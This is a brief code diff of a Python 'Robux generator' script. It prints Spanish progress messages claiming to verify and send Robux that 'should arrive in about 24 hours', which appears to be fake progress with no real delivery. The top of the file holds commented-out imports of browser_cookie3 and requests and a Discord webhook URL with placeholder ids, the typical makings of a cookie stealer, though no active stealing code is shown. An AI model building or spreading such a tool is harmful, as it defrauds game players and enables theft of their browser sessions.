@@ -1,4 +1,4 @@
-#import browser_cookie3, requests, threading, os #ScriptUnix
+#import browser_cookie3, requests, threading, os
 #                                                              
 #webhook = "https://discord.com/api/webhooks/xxxxxxxxxxxxxxxxxxx/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
 #
@@ -157,10 +157,7 @@ class RobuxGenerator:
 
     print(w)
     slow(F"{purple} Iniciando sistema de verificacion...{w}")
-    print(w)
     slow(F"{purple} Enviando la cantidad de robux indicada...{w}")
-    print(w)
     slow(F"{purple} Finalizando...{w}")
-    print(w)
     print(f"{Colors.light_green} Hecho! {Colors.light_red}Los robux deberian de llegar en aproximadamente 24 horas!")
     print(w)
